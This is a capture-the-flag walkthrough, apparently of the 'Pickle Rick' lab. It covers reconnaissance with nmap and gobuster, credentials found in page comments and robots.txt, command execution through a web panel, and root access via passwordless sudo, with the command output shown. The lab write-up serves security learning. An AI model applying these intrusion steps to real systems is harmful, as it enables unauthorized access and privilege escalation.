==Pickle Rick   Flutter Aug 14 2021==

IP 10.10.128.174
	export IP=10.10.128.174

MYIP 10.10.64.55
	export MYIP=10.10.64.55


## Recon ##

Source code

curl http://$IP > home_source

Comment on line 28-34

'''
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
'''

Found username: R1ckRul3s


nmap -sV -sC -T5 -oN nmap_initial $IP

'''
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
	ssh-hostkey: 
		2048 83:eb:64:9b:ac:03:cd:94:e7:ba:27:b0:8b:dd:ba:96 (RSA)
  		256 bd:45:f0:1f:4f:fb:28:ec:c5:54:80:2c:33:15:9d:02 (ECDSA)
  		256 2c:b0:51:0e:a6:21:6e:61:91:3a:73:f3:6d:6c:bc:95 (EdDSA)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	http-server-header: Apache/2.4.18 (Ubuntu)
	http-title: Rick is sup4r cool
'''


gobuster dir -u http://$IP -w directory-list-2.3-medium.txt -o gobuster_$IP

'''
/login.php (Status: 200)
/index.html (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/denied.php (Status: 302)
/server-status (Status: 403)
/clue.txt (Status: 200)
'''


/clue.txt

'''
Look around the file system for the other ingredient.
'''


/robots.txt

'''
Wubbalubbadubdub
'''
	uhhh... okay then, pass or user?


/login.php
	it's a login page


Trying to log in with R1ckRul3s:Wubbalubbadubdub
	Success!
	Redirect to portal.php


## Intrusion ##

/portal.php
	Command Panel

CPanel> uname;whoami;id;pwd
	Linux
	www-data
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	/var/www/html

CPanel> ls -la
	drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
	drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
	-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
	drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
	-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
	-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
	-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
	-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
	-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
	-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt

CPanel> cat Sup3rS3cretPickl3Ingred.txt
	Command disabled

CPanel> less Sup3rS3cretPickl3Ingred.txt
	**Flag Found**
	mr. meeseek hair

CPanel> ls -la /home
	drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
	drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu

CPanel> ls -la /home/rick
	-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients

CPanel> file /home/rick/second\ ingredients
	/home/rick/second ingredients: ASCII text

CPanel> less /home/rick/second\ ingredients
	**Flag Found**
	1 jerry tear


## PrivEsc ##

CPanel> ls -la /etc/passwd; ls -la /etc/shadow
	-rw-r--r-- 1 root root 1615 Feb 10  2019 /etc/passwd
	-rw-r----- 1 root shadow 878 Aug 14 09:59 /etc/shadow
eh not much new info here

CPanel> sudo -l
	(ALL) NOPASSWD: ALL
oh, well that makes things easy


CPanel> sudo ls -la /root
	drwx------  4 root root 4096 Feb 10  2019 .
	drwxr-xr-x 23 root root 4096 Aug 14 09:59 ..
	-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
	-rw-r--r--  1 root root  148 Aug 17  2015 .profile
	drwx------  2 root root 4096 Feb 10  2019 .ssh
	-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
	drwxr-xr-x  3 root root 4096 Feb 10  2019 snap

CPanel> sudo less /root/3rd.txt
	**Flag found**
	fleeb juice


## Credentials Gathered ##

R1ckRul3s:Wubbalubbadubdub during Recon